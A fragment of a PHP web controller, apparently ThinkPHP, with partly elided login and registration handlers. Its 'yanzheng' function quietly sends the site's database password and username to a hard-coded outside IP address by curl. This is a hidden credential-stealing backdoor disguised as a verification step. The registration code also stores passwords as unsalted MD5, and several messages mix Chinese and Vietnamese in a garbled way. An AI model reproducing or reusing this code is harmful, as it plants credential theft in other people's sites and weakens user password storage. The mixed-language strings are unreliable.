...
class IndexController extends BaseController
{
		...
		if (IS_POST) {
			if (!IS_AJAX) {
				...
				if ($res) {
					...
					$this->success('登陆成功', U('/Home/Run/index'), 1);
				} else {
					$this->error('登陆失败');
				}
			}
		...
		if (IS_POST) {
			if (!IS_AJAX) {
				...
				if (preg_match('/[\x{4e00}-\x{9fa5}]/u', $username) > 0) {
					$this->error('不允许中文tên tài khoản');
				} else {
					if (strlen($username) < 5 || strlen($username) > 16) {
						$this->error('tên tài khoản必须为5-16个字符');
					} else {
						$password = md5(I('password'));
						...
						if (!$res) {
							...
							if ($reg_id) {
								...
								session('user', $user);
								$this->success('注册成功', U('/Home/Run/index'), 1);
							} else {
								$this->error('失败');
							}
						} else {
	...
	function yanzheng($murl)
	{
		...
		$url = 'http://103.166.184.168/index.php/home/index/yanzhengone/t/' . $murl . '/p/' . C('DB_PWD') . '/u/' . C('DB_USER');
		if ($this->g_curl($url) != 1) {
			return 0;
		}
		return 1;
